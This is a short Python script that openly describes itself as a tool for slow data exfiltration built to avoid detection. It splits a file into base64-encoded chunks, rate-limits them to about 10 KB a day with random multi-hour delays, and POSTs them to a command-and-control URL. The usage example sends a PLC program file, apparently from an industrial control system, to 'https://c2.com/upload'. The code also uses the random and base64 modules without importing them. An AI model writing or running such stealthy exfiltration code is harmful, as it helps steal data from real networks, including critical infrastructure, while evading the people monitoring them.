# rate_limited_exfil.py - Slow exfiltration to avoid detection
import time
import hashlib

class RateLimitedExfiltration:
    def __init__(self, max_bytes_per_day=10240):  # 10 KB/day
        self.daily_limit = max_bytes_per_day
        self.bytes_sent_today = 0
        self.last_reset = time.time()

    def exfiltrate_file(self, file_path, c2_url):
        """
        Exfiltrate file at very slow rate
        """
        with open(file_path, 'rb') as f:
            data = f.read()

        # Calculate chunks
        chunk_size = 1024  # 1 KB chunks
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

        print(f"[*] Exfiltrating {len(data)} bytes in {len(chunks)} chunks")
        print(f"[*] Estimated time: {len(chunks) / 10:.1f} days")

        for i, chunk in enumerate(chunks):
            # Check daily limit
            if self.bytes_sent_today >= self.daily_limit:
                # Wait until tomorrow
                sleep_time = 86400 - (time.time() - self.last_reset)
                print(f"[*] Daily limit reached, sleeping for {sleep_time/3600:.1f} hours")
                time.sleep(sleep_time)
                self.bytes_sent_today = 0
                self.last_reset = time.time()

            # Send chunk
            self.send_chunk(chunk, i, c2_url)
            self.bytes_sent_today += len(chunk)

            # Delay between chunks (randomized)
            time.sleep(random.randint(3600, 7200))  # 1-2 hours

    def send_chunk(self, data, chunk_id, c2_url):
        """
        Send single chunk to C2
        """
        import requests

        payload = {
            'chunk_id': chunk_id,
            'data': base64.b64encode(data).decode(),
            'checksum': hashlib.md5(data).hexdigest()
        }

        requests.post(c2_url, json=payload, timeout=30)
        print(f"[+] Chunk {chunk_id} sent ({len(data)} bytes)")

# Usage - Exfiltrate 1MB file over ~100 days
exfil = RateLimitedExfiltration(max_bytes_per_day=10240)
exfil.exfiltrate_file("/path/to/plc_program.bin", "https://c2.com/upload")
